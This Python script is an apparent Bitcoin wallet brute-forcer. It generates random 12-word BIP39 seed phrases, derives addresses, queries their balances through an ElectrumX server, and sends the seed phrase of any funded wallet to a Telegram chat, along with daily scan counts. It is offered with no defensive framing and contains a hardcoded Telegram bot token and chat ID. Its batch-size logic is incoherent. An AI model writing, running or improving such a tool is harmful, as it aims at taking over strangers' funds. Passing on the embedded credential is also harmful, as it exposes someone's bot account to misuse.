import aiohttp
from aiogram import Bot
import asyncio
from datetime import datetime, timedelta
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
import logging

# Logger configuration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# Telegram credentials
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
TELEGRAM_CHAT_ID = "1596333326"

# ElectrumX server URL (localhost for local connections)
ELECTRUMX_SERVER_URL = "http://127.0.0.1:50002"

# Configuration
BATCH_SIZE = 5         # Initial batch size
MAX_WORKERS = 10       # Number of concurrent workers
DELAY_BETWEEN_BATCHES = 1  # Delay between batches in seconds
TIMEOUT_SECONDS = 10   # Timeout for each request
DAILY_RESET_HOUR = 0   # Reset wallet count at midnight

# Global variable to track the number of wallets scanned daily
wallets_scanned_today = 0

# Initialize the bot
bot = Bot(token=TELEGRAM_TOKEN)

def generate_bip39_seed():
    """Generate a random BIP39 seed."""
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)

def bip44_btc_address_from_seed(seed_phrase):
    """Generate a Bitcoin address from a BIP39 seed."""
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()

async def check_btc_balance_async(address, session):
    """Check the BTC balance of an address asynchronously using ElectrumX server."""
    url = f"{ELECTRUMX_SERVER_URL}/balance/{address}"
    try:
        async with session.get(url) as response:
            if response.status == 200:
                data = await response.json()
                balance = data.get("confirmed", 0) / 100000000  # Convert from Satoshi to BTC
                return balance
    except Exception as e:
        logger.error(f"Error checking balance for address {address}: {str(e)}")
    return 0

async def notify_telegram_async(message):
    """Send a message to Telegram asynchronously."""
    await bot.send_message(TELEGRAM_CHAT_ID, message)

async def process_wallet_async(seed, session):
    """Process a single wallet asynchronously."""
    global wallets_scanned_today
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = await check_btc_balance_async(btc_address, session)
    wallets_scanned_today += 1
    
    # Notify if balance is found
    if btc_balance > 0:
        message = f"⚠️ Wallet with balance found!\n\nSeed: {seed}\nAddress: {btc_address}\nBalance: {btc_balance} BTC"
        await notify_telegram_async(message)

async def dynamic_batch_manager():
    """Dynamically adjust batch size based on server response times."""
    global BATCH_SIZE
    while True:
        await asyncio.sleep(60)  # Adjust batch size every 60 seconds if needed
        if wallets_scanned_today % 50 == 0:
            # Example rule: Every 50 wallets scanned, adjust batch size by +1 if server is responsive
            BATCH_SIZE = min(BATCH_SIZE + 1, MAX_WORKERS)
        else:
            BATCH_SIZE = max(1, BATCH_SIZE - 1)  # Decrease if server is slow or unresponsive

async def daily_summary():
    """Send a daily summary of the number of wallets scanned."""
    global wallets_scanned_today
    while True:
        now = datetime.now()
        next_run = (now + timedelta(days=1)).replace(hour=DAILY_RESET_HOUR, minute=0, second=0, microsecond=0)
        await asyncio.sleep((next_run - now).total_seconds())
        
        # Send the daily summary
        summary_message = f"📊 Daily Wallet Scan Summary:\nTotal wallets scanned today: {wallets_scanned_today}"
        await notify_telegram_async(summary_message)
        
        # Reset the daily counter
        wallets_scanned_today = 0

async def seed_generator(queue, num_seeds):
    """Generate seeds and put them in a queue."""
    for _ in range(num_seeds):
        seed = generate_bip39_seed()
        await queue.put(seed)
    await queue.put(None)  # Sentinel value to signal the end

async def worker(queue, session):
    """Worker to process wallets from the queue."""
    while True:
        seed = await queue.get()
        if seed is None:
            queue.put_nowait(None)  # Pass sentinel to other workers
            break
        await process_wallet_async(seed, session)
        queue.task_done()

async def main_async():
    """Main function to scan wallets and handle daily summary notifications."""
    # Queue for task management
    queue = asyncio.Queue()
    seeds_to_generate = 50  # Number of seeds to test
    
    # Start dynamic batch adjustment
    asyncio.create_task(dynamic_batch_manager())
    # Start daily summary notifications
    asyncio.create_task(daily_summary())
    
    # Create an HTTP session with connection pooling
    connector = aiohttp.TCPConnector(limit=MAX_WORKERS)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT_SECONDS)) as session:
        # Generate seeds asynchronously and queue them
        seed_task = asyncio.create_task(seed_generator(queue, seeds_to_generate))
        
        # Create worker tasks
        worker_tasks = [asyncio.create_task(worker(queue, session)) for _ in range(MAX_WORKERS)]
        
        await seed_task
        await queue.join()  # Wait for the queue to be fully processed
        
        # Cancel worker tasks
        for task in worker_tasks:
            task.cancel()
        await asyncio.gather(*worker_tasks, return_exceptions=True)

if __name__ == "__main__":
    asyncio.run(main_async())
